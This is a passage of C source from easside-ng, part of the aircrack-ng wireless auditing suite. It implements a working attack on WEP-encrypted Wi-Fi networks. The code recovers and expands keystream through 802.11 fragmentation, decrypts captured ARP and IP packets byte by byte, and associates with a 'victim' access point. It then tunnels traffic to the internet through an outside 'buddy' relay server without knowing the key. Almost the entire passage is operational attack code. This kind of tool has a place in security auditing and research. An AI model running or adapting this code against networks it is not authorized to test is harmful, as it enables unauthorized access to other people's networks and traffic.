			assert((int) sizeof(es->es_packet) >= len);
			memcpy(es->es_packet, wh, len);
			es->es_have_packet = len;

			if (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS)
				es->es_have_src = 1;
			if ((wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) &&
			    wh->i_addr1[0] != 0)
				es->es_have_src = 1;
		}
		if (!es->es_have_arp && is_arp(wh, len-sizeof(*wh)-4-4)) {
			memcpy(es->es_packet_arp, wh, len);
			es->es_have_arp = len;
			if (es->es_astate == AS_DECRYPT_IP) {
				printf("\nPreempting to ARP decryption\n");
				es->es_astate = AS_FIND_IP;
			}
		}
	}

	len -= sizeof(*wh);

	switch (es->es_astate) {
	case AS_NOPRGA:
		base_prga(es, wh, len);
		es->es_astate = AS_PRGA_EXPAND;
		break;

	case AS_PRGA_EXPAND:
		check_expand(es, wh, len);
		break;

	case AS_FIND_IP:
		break;

	case AS_DECRYPT_ARP:
		check_decrypt_arp(es, wh, len);
		break;

	case AS_DECRYPT_IP:
		check_decrypt_ip(es, wh, len);
		break;

	case AS_FIND_RTR_MAC:
		check_rtr_mac(es, wh, len);
		break;

	case AS_CHECK_INET:
		break;

	case AS_REDIRECT:
		check_redirect(es, wh, len);
		break;

	default:
		abort();
		break;
	}
}

void read_wifi(struct east_state *es)
{
	unsigned char buf[4096];
	int len;
	struct ieee80211_frame *wh = (struct ieee80211_frame*) buf;

	len = wi_read(es->es_wi, buf, sizeof(buf), NULL);
	if (len == -1)
		err(1, "wi_read()");

	/* XXX: I don't do any length chex */
	if (len < 2) {
		printf("Short packet %d\n", len);
		return;
	}

	switch (wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK) {
	case IEEE80211_FC0_TYPE_MGT:
		read_mgt(es, wh, len);
		break;

	case IEEE80211_FC0_TYPE_CTL:
		read_ctl(es, wh, len);
		break;

	case IEEE80211_FC0_TYPE_DATA:
		read_data(es, wh, len);
		break;

	default:
		printf("Unknown type %x\n",
		       wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK);
		break;
	}
}

unsigned int msec_diff(struct timeval *after, struct timeval *before)
{
	unsigned int diff;

	assert(after->tv_sec >= before->tv_sec);

	if (after->tv_sec > before->tv_sec) {
		unsigned int usec;

		diff = (after->tv_sec - before->tv_sec - 1) * 1000;
		usec = 1000*1000 - before->tv_usec;
		usec += after->tv_usec;
		diff += usec/1000;
	}
	else /* after->tv_sec == before->tv_sec */
		diff = (after->tv_usec - before->tv_usec)/1000;

	return diff;
}

void msec_to_tv(int msec, struct timeval *tv)
{
	tv->tv_sec = msec/1000;
	tv->tv_usec = (msec - tv->tv_sec*1000)*1000;
}

void chan_hop(struct east_state *es, struct timeval *tv)
{
	struct timeval now;
	unsigned int elapsed;

	if (gettimeofday(&now, NULL) == -1)
		err(1, "gettimeofday()");

	elapsed = msec_diff(&now, &es->es_lasthop);

	/* hop */
	if (elapsed >= es->es_hopfreq) {
		es->es_apchan++;
		if (es->es_apchan > 12)
			es->es_apchan = 1;
		es->es_lasthop = now;
		set_chan(es);
		printf("Chan %.2d\r", es->es_apchan);
		fflush(stdout);

		msec_to_tv(es->es_hopfreq, tv);
	} else
		msec_to_tv(es->es_hopfreq - elapsed, tv);
}

unsigned short fnseq(unsigned short fn, unsigned short seq) {
        unsigned short r = 0;

	assert(fn < 16);

        r = fn;
        r |=  ( (seq % 4096) << IEEE80211_SEQ_SEQ_SHIFT);
        return r;
}

void fill_basic(struct east_state *es, struct ieee80211_frame *wh)
{
        unsigned short* sp;

	/* macs */
	memcpy(wh->i_addr1, es->es_apmac, sizeof(wh->i_addr1));
	memcpy(wh->i_addr2, es->es_mymac, sizeof(wh->i_addr2));
	memcpy(wh->i_addr3, es->es_apmac, sizeof(wh->i_addr3));

	/* duration */
	sp = (unsigned short*) wh->i_dur;
//	*sp = htole16(32767);
	*sp = htole16(0);

	/* seq */
	sp = (unsigned short*) wh->i_seq;
	*sp = fnseq(0, es->es_txseq);
}

void send_frame(struct east_state *es, void *buf, int len)
{
        int rc;

        rc = wi_write(es->es_wi, buf, len, NULL);
        if(rc == -1)
		err(1, "wi_write()");
        if (rc != len) {
                printf("ERROR: Packet length changed while transmitting (%d instead of %d).\n", rc, len);
                exit(1);
        }

	if (gettimeofday(&es->es_txlast, NULL) == -1)
		err(1, "gettimeofday()");
}

int too_early(struct timeval *tv, int to, struct timeval *last_sent)
{
	struct timeval now;
	unsigned int elapsed;

	/* check if timeout expired */
	if (gettimeofday(&now, NULL) == -1)
		err(1, "gettimeofday()");

	elapsed = msec_diff(&now, last_sent);
	if (elapsed < (unsigned int) to) {
		msec_to_tv(to - elapsed, tv);
		return 1;
	}

	msec_to_tv(to, tv);
	return 0;
}

void send_auth(struct east_state *es, struct timeval *tv)
{
	unsigned char buf[4096];
	struct ieee80211_frame *wh = (struct ieee80211_frame*) buf;
	unsigned short *sp;
	int len;

	if (too_early(tv, es->es_txto_mgt, &es->es_txlast))
		return;

	memset(buf, 0, sizeof(buf));

	es->es_txseq++;
	fill_basic(es, wh);
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_AUTH;

	/* transaction number */
	sp = (unsigned short*) (wh+1);
	sp++;
	*sp = htole16(1);

	len = sizeof(*wh) + 2 + 2 + 2;
	printf("Sending auth request\n");
	send_frame(es, wh, len);
}

void send_assoc(struct east_state *es, struct timeval *tv)
{
	unsigned char buf[4096];
	struct ieee80211_frame *wh = (struct ieee80211_frame*) buf;
	unsigned short *sp;
	int len;
	unsigned char *ptr;

	if (too_early(tv, es->es_txto_mgt, &es->es_txlast))
		return;

	memset(buf, 0, sizeof(buf));

	es->es_txseq++;
	fill_basic(es, wh);
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_ASSOC_REQ;

	sp = (unsigned short*) (wh+1);

	/* capability */
	*sp++ = htole16(IEEE80211_CAPINFO_ESS | IEEE80211_CAPINFO_PRIVACY);
	*sp++ = htole16(100); /* listen interval */

	/* ssid */
	ptr = (unsigned char*) sp;
	*ptr++ = IEEE80211_ELEMID_SSID;
	len = strlen(es->es_apssid);
	*ptr++ = len;
	strncpy((char*)ptr, es->es_apssid, 32);
	ptr += len;

	/* rates */
	*ptr++ = IEEE80211_ELEMID_RATES;
	*ptr++ = 8;
	*ptr++ = 2  | 0x80;
	*ptr++ = 4  | 0x80;
	*ptr++ = 11 | 0x80;
	*ptr++ = 22 | 0x80;
	*ptr++ = 12 | 0x80;
	*ptr++ = 24 | 0x80;
	*ptr++ = 48 | 0x80;
	*ptr++ = 72;

	/* x-rates */
	*ptr++ = IEEE80211_ELEMID_XRATES;
	*ptr++ = 4;
	*ptr++ = 48;
	*ptr++ = 72;
	*ptr++ = 96;
	*ptr++ = 108;

	len = ptr - buf;
	printf("Sending assoc request\n");
	send_frame(es, wh, len);
}

void put_crc32(void *data, int len)
{
	unsigned int *ptr = (unsigned int*) ((char*)data+len);

	*ptr = get_crc32(data, len);
}

void expand_prga(struct east_state *es, struct timeval *tv)
{
	unsigned char buf[2048];
	struct ieee80211_frame *wh = (struct ieee80211_frame*) buf;
	unsigned char *data = (unsigned char*) (wh+1);
        unsigned short* sp = (unsigned short*) wh->i_seq;
	int dlen;
	int early;
	int totlen;

	/* start from beginning */
	if (es->es_expand_num == -1) {
		es->es_txack = 0;
		es->es_expand_num = 0;
		es->es_txseq++;
		es->es_clearp = es->es_clear;
	}

	early = too_early(tv, es->es_txto_expand, &es->es_txlast);

	if (!es->es_txack && early)
		return;

	memset(buf, 0, sizeof(buf));

	/* see if we got an ack to move onto next frag */
	if (es->es_txack) {
		es->es_expand_num++;
		es->es_clearp = es->es_clearpnext;
		if (es->es_expand_num == es->es_expand_factor) {
			es->es_expand_num = 0;
			es->es_txseq++;
			es->es_clearp = es->es_clear;
		}
		es->es_txack = 0;
	} else
			wh->i_fc[1] |= IEEE80211_FC1_RETRY;

	if (es->es_expand_num == 0 && early)
		return;

	/* 802.11 header */
	fill_basic(es, wh);
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA | IEEE80211_FC0_SUBTYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_MORE_FRAG | IEEE80211_FC1_DIR_TODS
		       | IEEE80211_FC1_WEP;
	memset(wh->i_addr3, 0xff, 6);

	/* iv & crc */
	memcpy(data, es->es_iv, 3);
	data += 4;
	dlen = es->es_prgalen - 4;

	/* see how much we sent */
	totlen = dlen*es->es_expand_num;
	es->es_expand_len = totlen + dlen + 4;
	if ((int) sizeof(es->es_prga) < es->es_expand_len) {
		es->es_expand_len -= dlen;
		dlen = sizeof(es->es_prga) - totlen - 4;

		/* don't need as many frags; start over */
		if (dlen <= 0) {
			es->es_expand_num = -1;
			es->es_expand_len = sizeof(es->es_prga);
			return;
		}

		es->es_expand_len += dlen;
		wh->i_fc[1] &= ~IEEE80211_FC1_MORE_FRAG;
	}

	assert((es->es_clearp >= es->es_clear) && ((es->es_clearp + dlen)
	       < &es->es_clear[sizeof(es->es_clear)]));
	memcpy(data, es->es_clearp, dlen);
	es->es_clearpnext = es->es_clearp + dlen;

	put_crc32(data, dlen);
	xor(data, data, es->es_prga, es->es_prgalen);

	/* send frag */
	if ((es->es_expand_num+1) == es->es_expand_factor)
		wh->i_fc[1] &= ~IEEE80211_FC1_MORE_FRAG;

	*sp = fnseq(es->es_expand_num, es->es_txseq);
	printf("Sending %d byte fragment %d:%d\r",
	       dlen, es->es_txseq, es->es_expand_num);
	fflush(stdout);
	send_frame(es, wh, data - buf + dlen + 4);
}

void decrypt_packet(struct east_state *es, struct timeval *tv)
{
	unsigned char buf[2048];
	struct ieee80211_frame *wh = (struct ieee80211_frame*) buf;
	unsigned char *data = (unsigned char*) (wh+1);
	int dlen;

	if (too_early(tv, es->es_txto_decrypt, &es->es_txlast))
		return;

	memset(buf, 0, sizeof(buf));

	/* 802.11 header */
	es->es_txseq++;
	fill_basic(es, wh);
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA | IEEE80211_FC0_SUBTYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_DIR_TODS | IEEE80211_FC1_WEP;
	memcpy(wh->i_addr3, S_MCAST, 5);
	wh->i_addr3[5] = es->es_prga_d[es->es_prga_dlen];

	/* iv & crc */
	memcpy(data, es->es_prga_div, 3);
	data += 4;
	dlen = es->es_prga_dlen - 4 + 1;
	memcpy(data, es->es_clear, dlen);
	put_crc32(data, dlen);
	xor(data, data, es->es_prga_d, es->es_prga_dlen+1);

	printf_time("Guessing prga byte %d with %.2X\r",
		    es->es_prga_dlen, es->es_prga_d[es->es_prga_dlen]);
	fflush(stdout);
	send_frame(es, wh, data - buf + dlen + 4);

	es->es_prga_d[es->es_prga_dlen]++;
}

void decrypt_arp(struct east_state *es, struct timeval *tv)
{
	/* init */
	if (es->es_astate != AS_DECRYPT_ARP) {
		unsigned char clear[1024];
		unsigned char *prga = es->es_prga_d;
		unsigned char *ct;
		struct ieee80211_frame *wh = (struct ieee80211_frame*)
					     es->es_packet_arp;
		int len;
		es->es_astate = AS_DECRYPT_ARP;

		ct = (unsigned char*) (wh+1);
		memcpy(es->es_prga_div, ct, 3);
		ct += 4;

		len = known_clear(clear, wh, 8 + sizeof(struct arphdr) + 10*2);
		xor(prga, clear, ct, len);
		prga += len;

		*prga = 0;
		es->es_prga_dlen = prga - es->es_prga_d;
	}

	decrypt_packet(es, tv);
}

void decrypt_ip(struct east_state *es, struct timeval *tv)
{
	/* init */
	if (es->es_astate != AS_DECRYPT_IP) {
		unsigned char clear[1024];
		unsigned char *prga = es->es_prga_d;
		unsigned char *ct;
		struct ieee80211_frame *wh = (struct ieee80211_frame*)
					     es->es_packet;
		int len;
		unsigned short totlen;
		es->es_astate = AS_DECRYPT_IP;

		ct = (unsigned char*) (wh+1);
		memcpy(es->es_prga_div, ct, 3);
		ct += 4;

		/* llc snap */
		len = 8;
		memcpy(clear, S_LLC_SNAP_IP, len);
		xor(prga, clear, ct, len);
		prga += len; ct += len;

		/* ip hdr */
		len = 2;
		memcpy(clear, "\x45\x00", len);
		xor(prga, clear, ct, len);
		prga += len; ct += len;

		/* tot len */
		totlen = es->es_have_packet - sizeof(*wh) - 4 - 8 - 4;
		totlen = htons(totlen);
		len = 2;
		memcpy(clear, &totlen, len);
		xor(prga, clear, ct, len);
		prga += len; ct += len;

		*prga = 0;
		es->es_prga_dlen = prga - es->es_prga_d;
	}

	decrypt_packet(es, tv);
}

void find_ip(struct east_state *es, struct timeval *tv)
{
	if (es->es_rtrip.s_addr && es->es_myip.s_addr) {
		set_tap_ip(es);
		es->es_astate = AS_FIND_RTR_MAC;

		return;
	}

	if (es->es_have_arp)
		decrypt_arp(es, tv);
	else if (es->es_have_packet)
		decrypt_ip(es, tv);
}

void send_whohas(struct east_state *es, struct timeval *tv)
{
	unsigned char buf[2048];
	struct ieee80211_frame *wh = (struct ieee80211_frame*) buf;
	unsigned char *data = (unsigned char*) (wh+1);
	int dlen;
	struct arphdr *ah;
	unsigned char *datas;

	if (too_early(tv, es->es_txto_whohas, &es->es_txlast))
		return;

	memset(buf, 0, sizeof(buf));

	/* 802.11 header */
	es->es_txseq++;
	fill_basic(es, wh);
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA | IEEE80211_FC0_SUBTYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_DIR_TODS | IEEE80211_FC1_WEP;
	memset(wh->i_addr3, 0xff, 6);

	/* iv */
	memcpy(data, es->es_iv, 3);
	data += 4;
	datas = data;

	/* llc snap */
	memcpy(data, S_LLC_SNAP_ARP, 8);
	data += 8;

	/* arp */
	ah = (struct arphdr*) data;
	ah->ar_hrd = htons(ARPHRD_ETHER);
	ah->ar_pro = htons(ETHERTYPE_IP);
	ah->ar_hln = 6;
	ah->ar_pln = 4;
	ah->ar_op = htons(ARPOP_REQUEST);
	data = (unsigned char*) (ah+1);

	memcpy(data, es->es_mymac, 6);
	data += 6;
	memcpy(data, &es->es_myip, 4);
	data += 4;
	data += 6;
	memcpy(data, &es->es_rtrip, 4);
	data += 4;

	dlen = data - datas;
	put_crc32(datas, dlen);
	assert(es->es_prgalen >= dlen + 4);
	xor(datas, datas, es->es_prga, dlen + 4);

	printf("Sending who has %s", inet_ntoa(es->es_rtrip));
	printf(" tell %s\n", inet_ntoa(es->es_myip));
	send_frame(es, wh, data - buf + 4);
}

void check_inet(struct east_state *es, struct timeval *tv)
{
	unsigned char buf[2048];
	struct ieee80211_frame *wh = (struct ieee80211_frame*) buf;
	unsigned char *data = (unsigned char*) (wh+1);
	int dlen;
	struct ip *iph;
	unsigned char *datas;
	unsigned short *seq;
	struct udphdr *uh;

	if (too_early(tv, es->es_txto_checkinet, &es->es_txlast))
		return;

	memset(buf, 0, sizeof(buf));

	/* 802.11 header */
	es->es_txseq++;
	fill_basic(es, wh);
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA | IEEE80211_FC0_SUBTYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_DIR_TODS | IEEE80211_FC1_WEP;
	memcpy(wh->i_addr3, es->es_rtrmac, 6);

	/* iv */
	memcpy(data, es->es_iv, 3);
	data += 4;
	datas = data;

	/* llc snap */
	memcpy(data, S_LLC_SNAP_IP, 8);
	data += 8;

	/* ip */
	iph = (struct ip*) data;
	iph->ip_hl = 5;
	iph->ip_v = 4;
	iph->ip_len = htons(sizeof(*iph)+sizeof(*uh)+S_HELLO_LEN);
	iph->ip_id = htons(666);
	iph->ip_ttl = 69;
	iph->ip_p = IPPROTO_UDP;
	iph->ip_src = es->es_myip;
	iph->ip_dst = es->es_srvip;
	iph->ip_sum = in_cksum((unsigned short*)iph, 20);

	/* udp */
	uh = (struct udphdr*) (iph+1);
	uh->uh_sport = htons(53);
	uh->uh_dport = htons(es->es_udp_port);
	uh->uh_ulen = htons(sizeof(*uh)+S_HELLO_LEN);
	uh->uh_sum = 0;

	/* data */
	data = (unsigned char*) (uh+1);

	memcpy(data, "sorbo", 5);
	seq = (unsigned short*) (data+5);
	es->es_rpacket_id += 1;
	*seq = htons(es->es_rpacket_id);
	data += S_HELLO_LEN;

	dlen = data - datas;
	put_crc32(datas, dlen);
	assert(es->es_prgalen >= dlen + 4);
	xor(datas, datas, es->es_prga, dlen + 4);

	printf("Checking for internet... %d\n", es->es_rpacket_id);
	send_frame(es, wh, data - buf + 4);
	if (gettimeofday(&es->es_rtt, NULL) == -1)
		err(1, "gettimeofday()");
}

void redirect_sendip(struct east_state *es, struct rpacket *rp)
{
	unsigned char buf[2048];
	struct ieee80211_frame *wh = (struct ieee80211_frame*) buf;
	unsigned char *data = (unsigned char*) (wh+1);
	int dlen;
	struct ip *iph;
	unsigned char *datas;
	struct udphdr *uh;
	unsigned short *id;

	memset(buf, 0, sizeof(buf));

	/* 802.11 header */
	fill_basic(es, wh);
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA | IEEE80211_FC0_SUBTYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_DIR_TODS | IEEE80211_FC1_WEP
		       | IEEE80211_FC1_MORE_FRAG;
	memcpy(wh->i_addr3, es->es_rtrmac, 6);

	/* iv */
	memcpy(data, es->es_iv, 3);
	data += 4;
	datas = data;

	/* llc snap */
	memcpy(data, S_LLC_SNAP_IP, 8);
	data += 8;

	/* ip */
	iph = (struct ip*) data;
	iph->ip_hl = 5;
	iph->ip_v = 4;
	dlen = rp->rp_len - sizeof(*wh) - 4 - 4 + 2;
	iph->ip_len = htons(sizeof(*iph)+sizeof(*uh)+dlen);
	iph->ip_id = htons(666);
	iph->ip_ttl = 69;
	iph->ip_p = IPPROTO_UDP;
	iph->ip_src = es->es_myip;
	iph->ip_dst = es->es_srvip;
	iph->ip_sum = in_cksum((unsigned short*)iph, 20);

	/* udp */
	uh = (struct udphdr*) (iph+1);
	uh->uh_sport = htons(53);
	uh->uh_dport = htons(es->es_udp_port);
	uh->uh_ulen = htons(sizeof(*uh)+dlen);
	uh->uh_sum = 0;

	/* packet id */
	id = (unsigned short*) (uh+1);
	*id++ = htons(rp->rp_id);

	/* data */
	data = (unsigned char*) id;

	dlen = data - datas;
	put_crc32(datas, dlen);
	assert(es->es_prgalen >= dlen + 4);
	xor(datas, datas, es->es_prga, dlen + 4);

#if 0
	printf("Sending IP for %d %d:0\n",
	       rp->rp_id, es->es_txseq);
#endif
	send_frame(es, wh, data - buf + 4);
}

void redirect_sendfrag(struct east_state *es, struct rpacket *rp)
{
	unsigned char buf[2048];
	struct ieee80211_frame *wh = (struct ieee80211_frame*) buf;
	unsigned char *data = (unsigned char*) (wh+1);
	int dlen;
	unsigned short *sp = (unsigned short*) wh->i_seq;

	memset(buf, 0, sizeof(buf));

	/* 802.11 header */
	fill_basic(es, wh);
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA | IEEE80211_FC0_SUBTYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_DIR_TODS | IEEE80211_FC1_WEP;
	memcpy(wh->i_addr3, es->es_rtrmac, 6);
	memset(wh->i_addr3, 0xff, 6);
	*sp = fnseq(1, es->es_txseq);

	dlen = rp->rp_len - sizeof(*wh);
	memcpy(data, ((struct ieee80211_frame*)rp->rp_packet) + 1, dlen);

#if 0
	printf("Sending frag for %d %d:1 [%d]\n",
	       rp->rp_id, es->es_txseq, dlen - 8);
#endif
	send_frame(es, wh, sizeof(*wh) + dlen);
}


void redirect(struct east_state *es, struct timeval *tv)
{
	struct rpacket *rp = get_head(es);

	if (!rp)
		return;

	if (too_early(tv, es->es_txto_redirect, &es->es_txlast))
		return;

	es->es_txseq++;
	printf("Redirecting packet id %d len %d [qlen %d]\n",
	       rp->rp_id, rp->rp_len, queue_len(es));

	/* rtt */
	if (!es->es_rtt_id || (es->es_rtt_id = rp->rp_id)) {
		es->es_rtt_id = rp->rp_id;
		if (gettimeofday(&es->es_rtt, NULL) == -1)
			err(1, "gettimeofday()");
	}

	/* fire fragz */
	redirect_sendip(es, rp);
	usleep(1*1000);
	redirect_sendfrag(es, rp);
}

void associated(struct east_state *es, struct timeval *tv)
{
	switch (es->es_astate) {
	case AS_NOPRGA:
		break;

	case AS_PRGA_EXPAND:
		expand_prga(es, tv);
		break;

	case AS_FIND_IP:
		find_ip(es, tv);
		break;

	case AS_DECRYPT_ARP:
		decrypt_arp(es, tv);
		break;

	case AS_DECRYPT_IP:
		decrypt_ip(es, tv);
		break;

	case AS_FIND_RTR_MAC:
		send_whohas(es, tv);
		break;

	case AS_CHECK_INET:
		check_inet(es, tv);
		break;

	case AS_REDIRECT:
		redirect(es, tv);
		break;

	default:
		abort();
		break;
	}
}

void buddy_inet_check(struct east_state *es)
{
	struct {
		struct in_addr addr;
		unsigned short id;
	} __packed data;
	struct timeval now;
	int rtt;

	assert(sizeof(data) == 6);

	if (recv(es->es_buddys, &data, sizeof(data), 0) != sizeof(data))
		err(1, "buddy_inet_check: recv()");

	if (es->es_astate != AS_CHECK_INET)
		return;

	memcpy(&es->es_pubip, &data.addr, sizeof(es->es_pubip));
	printf("Internet w0rx.  Public IP %s\n", inet_ntoa(es->es_pubip));

	data.id = ntohs(data.id);
	if (data.id != es->es_rpacket_id) {
		printf("seq doesn't match %d %d\n",
		       data.id, es->es_rpacket_id);
		return;
	}

	if (gettimeofday(&now, NULL) == -1)
		err(1, "gettimeofday()");

	rtt = msec_diff(&now, &es->es_rtt);
	es->es_astate = AS_REDIRECT;
	printf("Rtt %dms\n", rtt);

	if (es->es_iponly)
		reset(es);
}

void buddy_packet(struct east_state *es)
{
	unsigned char buf[2048];
	unsigned short *p = (unsigned short*) buf;
	unsigned short id, len;
	struct rpacket *rp;
	struct ieee80211_frame *wh;
	unsigned char *ptr;
	int got = 0;
	int rc;

	if ((rc = recv(es->es_buddys, buf, 4, 0)) != 4) {
		if (rc == -1)
			err(1, "buddy_packet: recv() id & len");
		printf("buddy_packet: recv id len got %d/%d\n", rc, 4);
		exit(1);
	}

	id = ntohs(*p);
	p++;
	len = ntohs(*p);
	p++;

	assert(len+6 <= (int) sizeof(buf));

	ptr = &buf[6];
	got = 0;
	while (got != len) {
		int rem = len - got;
		rc = recv(es->es_buddys, ptr, rem, 0);
		if (rc == -1)
			err(1, "buddy_packet: recv() packet");
		got += rc;
		ptr += rc;
	}

	if (es->es_astate != AS_REDIRECT)
		return;

	printf_time("Got packet %d", id);
	if (es->es_rtt_id == id) {
		struct timeval now;
		int rtt;

		if (gettimeofday(&now, NULL) == -1)
			err(1, "gettimeofday()");

		rtt = msec_diff(&now, &es->es_rtt);
		es->es_rtt_id = 0;
		printf(" rtt %dms", rtt);

		if (es->es_srtt == 0)
			es->es_srtt = rtt;
		else {
			es->es_srtt += rtt;
			es->es_srtt >>= 1;
		}
		if (es->es_srtt == 0)
			es->es_srtt = 1;

		es->es_txto_redirect = es->es_srtt << 1;
		if (es->es_txto_redirect < S_MIN_RTO)
			es->es_txto_redirect = S_MIN_RTO;

		printf(" srtt %dms rto %dms",
		       es->es_srtt, es->es_txto_redirect);
	}
	rp = get_packet(es, id);
	if (!rp) {
		printf(" [not in queue]\n");
		return;
	}

	wh = (struct ieee80211_frame*) rp->rp_packet;
	memcpy(buf, get_da(wh), 6);
	memcpy(&buf[6], get_sa(wh), 6);

	len += 6;
	if (ti_write(es->es_ti, buf, len) != len)
		err(1, "ti_write()");

	remove_packet(es, id);
	printf(" qlen %d\n", queue_len(es));
	clear_timeout(es);
}

void read_buddy(struct east_state *es)
{
	unsigned short cmd;
	int rc;

	rc = recv(es->es_buddys, &cmd, sizeof(cmd), 0);
	if (rc != sizeof(cmd))
		err(1, "read_buddy: can't get cmd\n");

	cmd = ntohs(cmd);

	switch (cmd) {
	case S_CMD_INET_CHECK:
		buddy_inet_check(es);
		break;

	case S_CMD_PACKET:
		buddy_packet(es);
		break;

	default:
		abort();
		break;
	}
}

void read_tap(struct east_state *es)
{
	unsigned char buf[2048];
	struct ieee80211_frame *wh = (struct ieee80211_frame*) buf;
	unsigned char *data = (unsigned char*) (wh+1);
	int dlen;
	unsigned char *datas;
	unsigned char dst[6];
	struct timeval old;

	memset(buf, 0, sizeof(buf));

	dlen = ti_read(es->es_ti, data-2, S_MTU+14);
	if (dlen == -1)
		err(1, "ti_read()");
	memcpy(dst, data-2, 6);

	/* 802.11 header */
	es->es_txseq++;
	fill_basic(es, wh);
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA | IEEE80211_FC0_SUBTYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_DIR_TODS | IEEE80211_FC1_WEP;
	memcpy(wh->i_addr3, dst, 6);

	/* iv */
	memcpy(data, es->es_iv, 3);
	data[3] = 0;
	data += 4;
	datas = data;

	/* llc snap */
	memcpy(data, S_LLC_SNAP, 6);
	data += 8;

	dlen = dlen - 14 + 8;
	put_crc32(datas, dlen);
	assert(es->es_prgalen >= dlen + 4);
	xor(datas, datas, es->es_prga, dlen + 4);

	printf_time("Sending frame from tap %d\n", dlen);
	old = es->es_txlast;
	send_frame(es, wh, sizeof(*wh) + 4 + dlen + 4);
	es->es_txlast = old;
}

void own(struct east_state *es)
{
	fd_set rfds;
	struct timeval tv, *tvp;
	int maxfd;

	if (es->es_prgalen)
		es->es_astate = AS_PRGA_EXPAND;
	if (es->es_prgalen == sizeof(es->es_prga))
		es->es_astate = AS_FIND_IP;

	for (;;) {
		FD_ZERO(&rfds);
		maxfd = wi_fd(es->es_wi);
		FD_SET(maxfd, &rfds);
		memset(&tv, 0, sizeof(tv));
		tvp = NULL;

		if (es->es_buddys) {
			FD_SET(es->es_buddys, &rfds);
			if (es->es_buddys > maxfd)
				maxfd = es->es_buddys;
		}

		if (es->es_astate > AS_PRGA_EXPAND &&
		    es->es_state == S_ASSOCIATED) {
		    	int tapfd = ti_fd(es->es_ti);

			FD_SET(tapfd, &rfds);
			if (tapfd > maxfd)
				maxfd = tapfd;
		}

		switch (es->es_state) {
		case S_SEARCHING:
			if (!es->es_chanlock)
				chan_hop(es, &tv);
			break;

		case S_SENDAUTH:
			send_auth(es, &tv);
			break;

		case S_SENDASSOC:
			send_assoc(es, &tv);
			break;

		case S_ASSOCIATED:
			associated(es, &tv);
			break;

		default:
			abort();
			break;
		}

		if (tv.tv_sec || tv.tv_usec)
			tvp = &tv;

		if (select(maxfd+1, &rfds, NULL, NULL, tvp) == -1)
			err(1, "select()");

		if (FD_ISSET(wi_fd(es->es_wi), &rfds)) {
			read_wifi(es);
		}

		if (es->es_buddys && FD_ISSET(es->es_buddys, &rfds))
			read_buddy(es);

		if (FD_ISSET(ti_fd(es->es_ti), &rfds))
			read_tap(es);
	}
}

void usage(char *p)
{
	if (p) {}
    char *version_info = getVersion("Easside-ng", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC);
	printf("\n"
		"  %s - (C) 2007, 2008, 2009 Andrea Bittau\n"
		"  https://www.aircrack-ng.org\n"
		"\n"
		"  Usage: easside-ng <options>\n"
		"\n"
		"  Options:\n"
		"\n"
		"       -h                : This help screen\n"
		"       -v   <victim mac> : Victim BSSID\n"
		"       -m      <src mac> : Source MAC address\n"
		"       -i           <ip> : Source IP address\n"
		"       -r    <router ip> : Router IP address\n"
		"       -s     <buddy ip> : Buddy-ng IP address (mandatory)\n"
		"       -f        <iface> : Interface to use (mandatory)\n"
		"       -c      <channel> : Lock card to this channel\n"
		"       -n                : Determine Internet IP only\n"
		"\n",
		version_info);
	free(version_info);
}

void load_prga(struct east_state *es)
{
	int fd;
	int rc;

	fd = open(S_PRGA_LOG, O_RDONLY);
	if (fd == -1)
		return;

	rc = read(fd, es->es_iv, 3);
	if (rc != 3) {
		printf("Can't read IV from %s\n", S_PRGA_LOG);
		exit(1);
	}

	rc = read(fd, es->es_prga, sizeof(es->es_prga));
	if (rc == -1)
		err(1, "load_prga: read()");
	es->es_prgalen = rc;
	close(fd);

	printf("Loaded %d PRGA bytes from %s\n", es->es_prgalen, S_PRGA_LOG);
}

int main(int argc, char *argv[])
{
	int ch;
	struct east_state *es = &_es;

	init_defaults(es);

	while ((ch = getopt(argc, argv, "hv:m:i:r:s:f:nc:")) != -1) {
		switch (ch) {
		case 'c':
			es->es_chanlock = atoi(optarg);
			break;

		case 'f':
			strncpy(es->es_ifname, optarg, sizeof(es->es_ifname)-1);
			es->es_ifname[sizeof(es->es_ifname)-1] = 0;
			break;

		case 'v':
			if (str2mac(es->es_apmac, optarg) == -1) {
				printf("Can't parse AP mac\n");
				exit(1);
			}
			break;

		case 'm':
			if (str2mac(es->es_mymac, optarg) == -1) {
				printf("Can't parse my mac\n");
				exit(1);
			}
			es->es_setmac = 1;
			break;

		case 'i':
			if (!inet_aton(optarg, &es->es_myip)) {
				printf("Can't parse my ip\n");
				exit(1);
			}
			break;

		case 'r':
			if (!inet_aton(optarg, &es->es_rtrip)) {
				printf("Can't parse rtr ip\n");
				exit(1);
			}
			break;

		case 's':
			if (!inet_aton(optarg, &es->es_srvip)) {
				printf("Can't parse srv ip\n");
				exit(1);
			}
			break;

		case 'n':
			es->es_iponly = 1;
			break;

		case 'h':
		default:
			usage(argv[0]);
			exit(0);
		}
	}

	if (es->es_srvip.s_addr == 0) {
		printf("Need at least server IP\n");
		usage(argv[0]);
		exit(0);
	}

	load_prga(es);
	open_wifi(es);
	open_tap(es);
	set_mac(es);
	if (es->es_chanlock)
		set_chan(es);

	if (signal(SIGINT, sighand) == SIG_ERR)
		err(1, "signal(SIGINT)");
	if (signal(SIGTERM, sighand) == SIG_ERR)
		err(1, "signal(SIGTERM)");

	printf_time("Ownin...\n");
	own(es);

	die("the end");
	exit(0);
}
